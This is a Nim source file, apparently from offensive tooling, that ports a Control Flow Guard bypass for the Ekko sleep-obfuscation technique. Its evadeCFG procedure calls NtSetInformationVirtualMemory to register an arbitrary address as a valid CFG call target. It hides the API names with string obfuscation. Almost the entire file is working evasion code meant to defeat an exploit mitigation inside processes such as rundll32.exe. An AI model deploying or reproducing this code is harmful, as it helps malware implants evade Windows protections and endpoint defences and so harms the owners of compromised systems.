# This is a Nim-Port of the CFG bypass required for Ekko sleep to work in a CFG enabled process (like rundll32.exe)
# Original works : https://github.com/ScriptIdiot/sleepmask_ekko_cfg, https://github.com/Crypt0s/Ekko_CFG_Bypass
import winim/lean
import strenc

type
  CFG_CALL_TARGET_INFO {.pure.} = object
    Offset: ULONG_PTR
    Flags: ULONG_PTR

type 
  VM_INFORMATION {.pure.} = object
    dwNumberOfOffsets: DWORD
    plOutput: ptr ULONG
    ptOffsets: ptr CFG_CALL_TARGET_INFO
    pMustBeZero: PVOID
    pMoarZero: PVOID

type 
  MEMORY_RANGE_ENTRY {.pure.} = object
    VirtualAddress: PVOID
    NumberOfBytes: SIZE_T

type 
  VIRTUAL_MEMORY_INFORMATION_CLASS {.pure.} = enum
    VmPrefetchInformation
    VmPagePriorityInformation
    VmCfgCalltargetInformation
    VmPageDirtyStateInformation

type 
  NtSetInformationVirtualMemory_t = proc (hProcess: HANDLE, VmInformationClass: VIRTUAL_MEMORY_INFORMATION_CLASS, NumberOfEntries: ULONG_PTR, VirtualAddresses: ptr MEMORY_RANGE_ENTRY, VmInformation: PVOID, VmInformationLength: ULONG): NTSTATUS {.stdcall.}

# Value taken from: https://www.codemachine.com/downloads/win10.1803/winnt.h
var CFG_CALL_TARGET_VALID = 0x00000001

proc evadeCFG*(address: PVOID): BOOl =
  var dwOutput: ULONG
  var status: NTSTATUS
  var mbi: MEMORY_BASIC_INFORMATION
  var VmInformation: VM_INFORMATION
  var VirtualAddresses: MEMORY_RANGE_ENTRY
  var OffsetInformation: CFG_CALL_TARGET_INFO
  var size: SIZE_T

  # Get start of region in which function resides 
  size = VirtualQuery(address, addr(mbi), sizeof(mbi))
  
  if size == 0x0:
    return false

  if mbi.State != MEM_COMMIT or mbi.Type != MEM_IMAGE:
    return false

  # Region in which to mark functions as valid CFG call targets
  VirtualAddresses.NumberOfBytes = cast[SIZE_T](mbi.RegionSize)
  VirtualAddresses.VirtualAddress = cast[PVOID](mbi.BaseAddress)

  # Create an Offset Information for the function that should be marked as valid for CFG
  OffsetInformation.Offset = cast[ULONG_PTR](address) - cast[ULONG_PTR](mbi.BaseAddress)
  OffsetInformation.Flags = CFG_CALL_TARGET_VALID # CFG_CALL_TARGET_VALID

  # Wrap the offsets into a VM_INFORMATION
  VmInformation.dwNumberOfOffsets = 0x1
  VmInformation.plOutput = addr(dwOutput)
  VmInformation.ptOffsets = addr(OffsetInformation)
  VmInformation.pMustBeZero = nil
  VmInformation.pMoarZero = nil

  # Resolve the function
  var NtSetInformationVirtualMemory = cast[NtSetInformationVirtualMemory_t](
    GetProcAddress(LoadLibraryA(obf("ntdll")), obf("NtSetInformationVirtualMemory"))
    )

  # Register `address` as a valid call target for CFG
  status = NtSetInformationVirtualMemory(
    GetCurrentProcess(), 
    VmCfgCalltargetInformation, 
    cast[ULONG_PTR](1), 
    addr(VirtualAddresses), 
    cast[PVOID](addr(VmInformation)), 
    cast[ULONG](sizeof(VmInformation))
    )

  if status != 0x0:
    return false

  return true